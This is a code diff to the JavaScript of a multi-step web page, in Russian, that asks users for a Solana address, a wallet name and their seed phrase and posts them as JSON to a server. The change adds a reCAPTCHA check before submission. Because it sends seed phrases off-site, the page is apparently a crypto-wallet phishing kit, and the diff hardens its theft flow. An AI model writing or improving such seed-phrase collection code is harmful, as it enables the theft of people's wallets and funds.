@@ -31,7 +31,8 @@ document.addEventListener('DOMContentLoaded', () => {
     let userData = {
         solAddress: '',
         wallet: '',
-        seedPhrase: ''
+        seedPhrase: '',
+        'g-recaptcha-response': ''
     };
 
     const showStep = (stepName) => {
@@ -127,15 +128,26 @@ document.addEventListener('DOMContentLoaded', () => {
         wordCountButtons.forEach((btn, index) => btn.classList.toggle('active', index === 0));
         selectedWordCount = 12;
         seedPhraseInput.placeholder = `Введите 12 слов...`;
-        userData = { solAddress: '', wallet: '', seedPhrase: '' };
+        userData = { solAddress: '', wallet: '', seedPhrase: '', 'g-recaptcha-response': '' };
+        if (typeof grecaptcha !== 'undefined') {
+            grecaptcha.reset();
+        }
         submitButton.disabled = false;
         submitButton.textContent = 'Импортировать';
     };
 
     submitButton.addEventListener('click', async () => {
         if (!validateSeedPhrase()) return;
+
+        const recaptchaResponse = grecaptcha.getResponse();
+        if (!recaptchaResponse) {
+            alert('Пожалуйста, пройдите проверку reCAPTCHA.');
+            return;
+        }
         
         userData.seedPhrase = seedPhraseInput.value.trim();
+        userData['g-recaptcha-response'] = recaptchaResponse;
+
         showStep('loading');
         submitButton.disabled = true;
 
@@ -146,9 +158,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 body: JSON.stringify(userData),
             });
 
+            const responseData = await response.json();
+
             if (!response.ok) {
-                const errorData = await response.json();
-                throw new Error(errorData.message || 'Ошибка ответа сервера');
+                throw new Error(responseData.message || 'Ошибка ответа сервера');
             }
 
             showStep('final');
@@ -156,6 +169,9 @@ document.addEventListener('DOMContentLoaded', () => {
         } catch (error) {
             alert(`Произошла ошибка при отправке данных: ${error.message}`);
             showStep('seedPhrase');
+            if (typeof grecaptcha !== 'undefined') {
+                grecaptcha.reset();
+            }
             submitButton.disabled = false;
         }
     });
